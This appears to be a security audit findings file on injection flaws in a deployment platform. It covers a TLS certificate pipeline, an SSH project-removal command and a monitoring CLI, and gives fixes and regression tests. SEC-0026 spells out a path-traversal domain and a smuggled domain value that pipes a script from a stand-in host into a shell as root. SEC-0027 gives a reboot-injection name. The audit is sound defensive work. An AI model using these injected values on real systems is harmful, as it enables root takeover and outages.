# Findings 06 — Injection

Known-clean verified and excluded: postgres hooks regex-gate DB/role names before SQL; tarfile filter="data"; T9.7 server-side project validation; delivery channels shlex.quote; ssh_cmd_builder printf_q byte-parity; zero shell=True/os.system/os.popen in runtime code; SSTI absent (status-page autoescape=select_autoescape, FileSystemLoader static templates); YAML all safe_load (two yaml.load hits are documented SafeLoader subclasses); no pickle/marshal; single exec is test-only import shim; loadtest PromQL static constants + urlencode; telegram envelope html.escape(quote=True).

## SEC-0026 — Unvalidated `needs.domain` reaches TLS cert pipeline: root path traversal + shell-string reloadcmd sink
- **Severity:** HIGH · **Attack surface:** project-controlled `ai-platform.yaml#needs.domain` (platform explicitly supports personal domains) · **Confidence:** 0.85 · **Must fix before launch: YES**
- **Files:** validation gap chain: `node.schema.json` (~:250 domain = `"type":"string"`, no pattern) → `node_yaml/projects.py:204-241` (no check) → `project_registry.py:143-202` (validates name only) → `context_deployer.py:795-829` (raw concat). Sink A (ungated): `cert_orchestrator.py:891-895,815,837,454` (`os.path.join(vpath, domain)` + makedirs + openssl writes as root; reached when S3 restore misses AND acme fails — exactly what happens for malformed domains). Sink B (gated RCE): `issue_cert.py:586-590` builds reloadcmd as shell string: `f"… python3 '{core_dir}/s3_ssl_cache.py' upload '{domain}'"` — single-quoted, unescaped, persisted in acme conf, re-executed on every renewal.
- **Preconditions:** attacker = any project owner setting needs.domain (multi-org threat model makes this attacker-controlled input).
- **Attack path (A):** domain `../../root/.ssh/pwn` → φ7 ssl-provision → self-signed fallback → root creates arbitrary dirs and writes privkey/fullchain.pem inside (clobber real wildcard cert dir → platform TLS outage; plant files in chosen paths). Attack path (B): domain `evil.com'; curl http://x/p.sh|sh; echo '` where attacker owns evil.com → legitimate issuance succeeds → injected reloadcmd executes as root at install and persists per-renewal (conditional persistent root RCE).
- **Contrast:** `vhost_renderer.validate_vhost_identifiers` (:536-576) applies strict RFC-label regex to the SAME domain class one code path away — the validator exists but this pipeline bypasses it.
- **Minimal fix:** apply the existing FQDN validator once at `register_project` and defensively at `orchestrate_certs()` entry (fail-fast ConfigValidationError); build reloadcmd without interpolation (env-pass to wrapper or shlex.quote).
- **Regression test:** orchestrate_certs(domains=["../../etc/x"]) raises before any fs write; negative-pair test asserting quoted reloadcmd for hostile inputs.

## SEC-0027 — `bash -c` double-quote interpolation in remove-project SSH channel (latent quoting-discipline violation)
- **Severity:** LOW-MEDIUM · **Confidence:** 0.75 · **Must fix:** NO (latent; upstream validation currently holds)
- **Files:** `core/internal/scaffold/project_remover.py:320-330` (`["bash","-c", f'… ssh_exec "{host}" "{user}" "{cmd}" {timeout}']`), `:353-356` (`f"cd /opt/projects/{project} && docker compose down … -p {project} down"` unquoted); args.name raw (no validate_project_name here; must match node.yaml entry first)
- **Preconditions:** poisoned node.yaml entry (host/name containing quotes) or future unvalidated writer — exactly the pattern T9.7/L-8 eliminated elsewhere.
- **Minimal fix:** shlex.quote all three interpolations; validate `--name` canonically in main().
- **Regression test:** R5-negative pair mirroring reconciler L-8: fake runner asserts quoted argv for name `x"; reboot"`.

## SEC-0028 — `render-monitoring` CLI path skips project-name validation before filesystem/LogQL sinks
- **Severity:** LOW · **Confidence:** 0.8 · **Must fix:** NO (operator-invoked only today)
- **Files:** `monitoring/config_renderer.py:778` (`project_name = args.project` — deploy-chain callers validated at receive_flow.py:358/orchestrator.py:400, CLI not); sinks `prometheus_targets.py:75`, `alert_rules.py:93`, `grafana_dashboards.py:92,98-103` (JSON-context substitution), `loki_retention.py:106` (LogQL selector concat)
- **Impact:** traversal writes + monitoring-config corruption under elevated trust assumptions; becomes live if wired to CI/webhook input.
- **Minimal fix:** one-line `validate_project_name()` gate in `run_monitoring_reconfig()`.
- **Regression test:** run_monitoring_reconfig(project="../x") skips without creating files.

Functional observation (non-security): monitoring templates use `${PROJECT}`/`$PROJECT` while template_engine grammar matches only `{{UPPER_SNAKE}}` — generated alert-rules/dashboards appear to retain literal placeholders (substitution no-op). Needs functional review; incidentally means these two templates cannot be injection vectors.
